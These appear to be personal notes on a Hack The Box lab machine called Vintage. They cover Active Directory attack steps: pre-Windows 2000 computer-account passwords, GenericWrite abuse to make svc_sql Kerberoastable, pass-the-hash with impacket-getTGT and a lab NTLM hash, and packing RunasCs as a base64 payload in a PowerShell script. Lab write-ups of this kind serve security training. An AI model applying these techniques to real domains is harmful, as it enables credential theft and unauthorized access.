adjust bloodhound CE cypher to view only our current domain
WHERE t.objectid ENDS WITH '-512' AND s<>t AND t.domain = 'VINTAGE.HTB' AND s.domain = 'VINTAGE.HTB'

"Doing some research about pre-windows 2000, we have a blog by TrustedSec, and this means that
when the pre-create computer accounts with the "Assign this computer account as a pre-Windows
2000 computer" checkmark, the password for the computer account becomes the same as the
computer account in lowercase. The group isn't the configuration; instead, it is a hint about the
computer object."
https://trustedsec.com/blog/diving-into-pre-created-computer-accounts

computer account name is:
FS01.VINTAGE.HTB

"Once the user is added to the ServiceManager group, the attacker has to request another
Kerberos ticket. Once the ticket is requested, the group will have GenericWrite for over three
user objects. One of them is svc_sql , which is a disabled account"

"As we have GenericWrite, we can modify the object's LDAP attribute; this allows us to modify the
user account to reenable it and add an SPN to make it Kerberoastable"


┌──(root㉿kali)-[/home/kali]
└─# impacket-getTGT vintage.htb/GMSA01 -hashes aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38 -dc-ip 10.10.11.45
export KRB5CCNAME=$(pwd)/GMSA01.ccache

to winrm you must have /etc/krb5.conf configured with:

[libdefaults]
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
    }


You can set a custom krb5.conf for your terminal session by exporting the KRB5_CONFIG environment variable.

┌──(root㉿kali)-[/home/kali]
└─# export KRB5_CONFIG=$(pwd)/krb5.conf

"We can enumerate stored credentials in the credentials manager. To enumerate them, we need an
Interactive session with a valid profile. The WinRM session is not an interactive session but rather a
network logon; one can find a better explanation on Bitvise blog. The RunasCs tool has mentioned
forcing the profile to allow the spawned process to have all required environment variables and
user profiles."

the isue was not AV, but attempting to run a 32 bit dll called from the .ps1 script.

┌──(root㉿kali)-[/home/kali/Downloads]
└─# mcs -platform:x64 -sdk:2 -out:RunasCs.dll RunasCs.cs                                                         

┌──(root㉿kali)-[/home/kali/Downloads]
└─# base64 -w0 RunasCs.dll > RunasCs_x64.b64

then we insert the new base64 payload into the ps1 script and proceed.
